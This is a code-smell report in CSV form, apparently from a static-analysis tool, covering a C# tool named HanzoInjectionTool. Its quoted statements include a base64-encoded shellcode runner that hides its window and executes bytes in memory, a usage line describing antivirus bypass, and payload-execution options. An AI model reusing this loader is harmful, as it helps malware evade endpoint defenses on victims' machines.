Implementation smell,Namespace,Class,File,Method,Description
Complex Method,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,Main,Cyclomatic complexity of the method is 9
Long Parameter List,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,VirtualProtect,The method has 4 parameters.
Long Statement,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,memoria_execute,The length of the statement  "	string arquivo = "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uVGV4dDsNCnVza" + "W5nIFN5c3RlbS5HbG9iYWxpemF0aW9uOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXN" + "pbmcgU3lzdGVtLlRocmVhZGluZzsNCnVzaW5nIFN5c3RlbS5YbWw7DQpuYW1lc3BhY2UgRXhwbG9pdFNoZWxsY29kZUV4ZWMNCnsNCiAgICBjbGFzcyBQcm9ncmFtDQogICAgew0KICAgICAgICBbR" + "GxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgLy9bRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBib29" + "sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KICAgICAgICBwdWJsaWMgZGVsZ" + "WdhdGUgdWludCBSZXQxQXJnRGVsZWdhdGUodWludCBhZGRyZXNzKTsNCiAgICAgICAgc3RhdGljIHVpbnQgUGxhY2VIb2xkZXIxKHVpbnQgYXJnMSkgeyByZXR1cm4gMDsgfQ0KICAgICAgICBbRGx" + "sSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NC" + "iAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQoNCiAgICAgICAgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICBjb25" + "zdCBpbnQgU1dfU0hPVyA9IDU7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGxlcnBheWxvYWQoc3RyaW5nIG5vbWVfYXJxdWl2bykNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgK" + "FN0cmVhbSBtZXVfYXJxdWl2byA9IG5ldyBGaWxlU3RyZWFtKEVudmlyb25tZW50LkN1cnJlbnREaXJlY3RvcnkgKyAiLyIgK25vbWVfYXJxdWl2bywNCiAgICAgICAgICAgRmlsZU1vZGUuT3Blbik" + "pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHRhbWFuaG8gPSBtZXVfYXJxdWl2by5MZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5dGVzaGV4YSA9IG5ldyBieXRlW3Rhb" + "WFuaG9dOw0KICAgICAgICAgICAgICAgIG1ldV9hcnF1aXZvLlJlYWQoYnl0ZXNoZXhhLCAwLCAoaW50KXRhbWFuaG8pOw0KICAgICAgICAgICAgICAgIHJldHVybiBieXRlc2hleGE7DQogICAgICA" + "gICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB1bnNhZmUgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaGFuZGxlID0gR2V0Q29uc" + "29sZVdpbmRvdygpOw0KDQogICAgICAgICAgICAvLyBIaWRlDQogICAgICAgICAgICBTaG93V2luZG93KGhhbmRsZSwgU1dfSElERSk7DQogICAgICAgICAgICBzdHJpbmcgaGV4YUJpbnBheWxvYWQ" + "gPSAibWluaGFfc3RyaW5nIjsNCiAgICAgICAgICAgIGJ5dGVbXSBzaGVsbGNvZGVoZXggPSBIZXhTdHJpbmdUb0J5dGVBcnJheShoZXhhQmlucGF5bG9hZCk7DQogICAgICAgICAgICBDb25zb2xlL" + "ldyaXRlTGluZSgiZXhjdXRhbmRvLi4uIik7DQogICAgICAgICAgICBleGVjdXRhcihzaGVsbGNvZGVoZXgpOw0KICAgICAgICB9DQoNCiAgICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIEhleFN" + "0cmluZ1RvQnl0ZUFycmF5KHN0cmluZyBIZXgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBCeXRlcyA9IG5ldyBieXRlW0hleC5MZW5ndGggLyAyXTsNCiAgICAgICAgICAgIGludFtdI" + "HZhbG9yZXMgPSBuZXcgaW50W10geyAweDAwLCAweDAxLCAweDAyLCAweDAzLCAweDA0LCAweDA1LCANCiAgICAgICAweDA2LCAweDA3LCAweDA4LCAweDA5LCAweDAwLCAweDAwLCAweDAwLCAweDA" + "wLCAweDAwLCAweDAwLCAweDAwLCANCiAgICAgICAweDBBLCAweDBCLCAweDBDLCAweDBELCAweDBFLCAweDBGIH07DQoNCiAgICAgICAgICAgIGZvciAoaW50IHggPSAwLCBpID0gMDsgaSA8IEhle" + "C5MZW5ndGg7IGkgKz0gMiwgeCArPSAxKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEJ5dGVzW3hdID0gKGJ5dGUpKHZhbG9yZXNbQ2hhci5Ub1VwcGVyKEhleFtpICsgMF0pIC0gJzA" + "nXSA8PCA0IHwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWxvcmVzW0NoYXIuVG9VcHBlcihIZXhbaSArIDFdKSAtICcwJ10pOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgI" + "CAgICByZXR1cm4gQnl0ZXM7DQogICAgICAgIH0NCg0KICAgICAgICB1bnNhZmUgcHVibGljIHN0YXRpYyB2b2lkIGV4ZWN1dGFyKGJ5dGVbXSBhc21CeXRlcykNCiAgICAgICAgew0KICAgICAgICA" + "gICAgZml4ZWQgKGJ5dGUqIHN0YXJ0QWRkcmVzcyA9ICZhc21CeXRlc1swXSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gcGVnYW5kbyBmZWlsZGluZm8gZG8gbcOpdG9kbyAiX" + "21ldGhvZFB0ciINCiAgICAgICAgICAgICAgICBUeXBlIGRlbFR5cGUgPSB0eXBlb2YoRGVsZWdhdGUpOw0KICAgICAgICAgICAgICAgIEZpZWxkSW5mbyBfbWV0aG9kUHRyID0gZGVsVHlwZS5HZXR" + "GaWVsZCgiX21ldGhvZFB0ciIsIEJpbmRpbmdGbGFncy5Ob25QdWJsaWMgfA0KICAgICAgICAgICAgICAgQmluZGluZ0ZsYWdzLkluc3RhbmNlKTsNCiAgICAgICAgICAgICAgICAvLyByZXQgZGVsZ" + "WdhZXRlDQogICAgICAgICAgICAgICAgUmV0MUFyZ0RlbGVnYXRlIGRlbCA9IG5ldyBSZXQxQXJnRGVsZWdhdGUoUGxhY2VIb2xkZXIxKTsNCiAgICAgICAgICAgICAgICBfbWV0aG9kUHRyLlNldFZ" + "hbHVlKGRlbCwgKEludFB0cilzdGFydEFkZHJlc3MpOw0KICAgICAgICAgICAgICAgIC8vZGVzYWJpbGl0YXIgYSBwcm90ZcOnw6NvIA0KICAgICAgICAgICAgICAgIHVpbnQgb3V0T2xkUHJvdGVjd" + "GlvbjsNCiAgICAgICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdCgoSW50UHRyKXN0YXJ0QWRkcmVzcywgKHVpbnQpYXNtQnl0ZXMuTGVuZ3RoLCAweDQwLCBvdXQgb3V0T2xkUHJvdGVjdGlvbik7DQo" + "gICAgICAgICAgICAgICAgLy8gZXhldHV0YXIgc2hlbGxjb2RlDQogICAgICAgICAgICAgICAgdWludCBuID0gKHVpbnQpMHgwMDAwMDAwMTsNCiAgICAgICAgICAgICAgICBuID0gZGVsKG4pOw0KI" + "CAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MDp4fSIsIG4pOw0KICAgICAgICAgICAgICAgIENvbnNvbGUuUmVhZEtleSgpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgIH0NCiA" + "gICB9DQp9DQo="; " is 4670.
Long Statement,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,memoria_execute,The length of the statement  "	string rcode = "dWludCBvdXRPbGRQcm90ZWN0aW9uOw0KICAgICAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0" + "KChJbnRQdHIpc3RhcnRBZGRyZXNzLCAodWludClhc21CeXRlcy5MZW5ndGgsIDB4NDAsIG91dCBvdXRPbGR" + "Qcm90ZWN0aW9uKTsNCiAgICAgICAgICAgICAgICAvLyBleGV0dXRhciBzaGVsbGNvZGUNCiAgICAgICAgIC" + "AgICAgICB1aW50IG4gPSAodWludCkweDAwMDAwMDAxOw0KICAgICAgICAgICAgICAgIG4gPSBkZWwobik7D" + "QogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswOnh9Iiwgbik7DQogICAgICAgICAgICAg" + "ICAgQ29uc29sZS5SZWFkS2V5KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgfQ0KICAgIH0NCn0="; " is 527.
Long Statement,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,modo_de_uso,The length of the statement  "	Console.WriteLine ("the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions. \n"); " is 138.
Long Statement,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,HexStringToByteArray,The length of the statement  "		Bytes_convertidos [x] = (byte)(valores [Char.ToUpper (Hex [i + 0]) - '0'] << 4 | valores [Char.ToUpper (Hex [i + 1]) - '0']); " is 125.
Magic Number,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,Main,The following statement contains a magic number: if (args.Length == 2) {  	if (args.Contains ("-e") || args.Contains ("--execute")) {  		string arquivo = args [1];  		Console.WriteLine ("[!] Executing payload: ");  		byte[] converterfuncao = lerpayload (arquivo);  		executar (converterfuncao);  		Console.ForegroundColor = ConsoleColor.Cyan;  		Console.Write ("[*] ");  		Console.ResetColor ();  		Console.WriteLine ("Binary Executed!");  	}  }  
Magic Number,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,Main,The following statement contains a magic number: if (args.Length == 4) {  	if (args.Contains ("-p") || (args.Contains ("--payload"))) {  		string payload;  		payload = args [1];  		string arquivo_criar;  		arquivo_criar = args [3];  		if (args [2] == "-o" || args [2] == "--output") {  			memoria_execute (payload' arquivo_criar);  		}  	}  }  
Magic Number,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,Main,The following statement contains a magic number: if (args.Length == 4) {  	if (args.Contains ("-p") || (args.Contains ("--payload"))) {  		string payload;  		payload = args [1];  		string arquivo_criar;  		arquivo_criar = args [3];  		if (args [2] == "-o" || args [2] == "--output") {  			memoria_execute (payload' arquivo_criar);  		}  	}  }  
Magic Number,HanzoInjectionTool,Principal,D:\newReposJune17\P0cL4bs_hanzoInjection\src\Program.cs,Main,The following statement contains a magic number: if (args.Length == 4) {  	if (args.Contains ("-p") || (args.Contains ("--payload"))) {  		string payload;  		payload = args [1];  		string arquivo_criar;  		arquivo_criar = args [3];  		if (args [2] == "-o" || args [2] == "--output") {  			memoria_execute (payload' arquivo_criar);  		}  	}  }  
